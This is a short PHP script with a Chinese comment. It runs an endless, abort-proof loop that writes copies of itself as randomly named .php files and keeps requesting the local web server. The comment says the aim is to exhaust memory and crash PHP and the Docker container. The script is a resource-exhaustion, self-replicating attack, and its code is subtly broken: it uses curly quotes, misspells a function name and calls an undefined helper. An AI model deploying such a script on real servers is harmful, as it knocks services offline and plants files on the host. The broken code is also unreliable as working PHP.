<?php

    set_time_limit(0);

    ignore_user_abort(true);

    while(1){

        file_put_contents(randstr().’.php’,file_get_content(__FILE__));

        file_get_contents(“http://127.0.0.1/“);

    }
/*
根据代码，不难看出这个脚本的功能。

常驻内存之后，进入死循环。

循环内部是实现无效複製自身并且访问web服务的功能。

执行的后果就是内存爆炸，php就GG了，严重点的话，Docker也GG。*/
?>